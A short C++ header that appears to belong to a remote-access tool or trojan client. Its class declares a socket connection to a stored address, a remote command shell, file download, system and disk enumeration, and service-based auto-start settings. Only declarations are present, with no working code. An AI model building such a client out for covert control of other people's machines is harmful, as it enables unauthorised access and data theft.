#pragma once
#include "MySocket.h"
#include "SystemInfo.h"
#include "Disk.h"
#include "CmdShell.h"
#include "Task.h"
class CThreadMain
{
public:
	CThreadMain();
	~CThreadMain();
	SOCKET Run();
	void Command(SOCKET Sock);
	wchar_t MyServiceName[220];
	void GetInfo(char info[]);
	bool RunFlag;

private:
	void ExecCommand(MSGINFO_S msg, SOCKET l_Socket);
	static DWORD WINAPI ToDownFile(LPVOID self);
	static DWORD WINAPI SendCmd(LPVOID self);
	static DWORD WINAPI InitCmd(LPVOID self);
	SOCKET m_Socket;
	CMySocket m_sock;
	char address[160];
	int Time;
	int SetupDir;
	int AutoFlag;
	CSystemInfo m_sys;
	CDisk m_disk;
	CCmdShell m_cmd;
	CTask m_task;
};

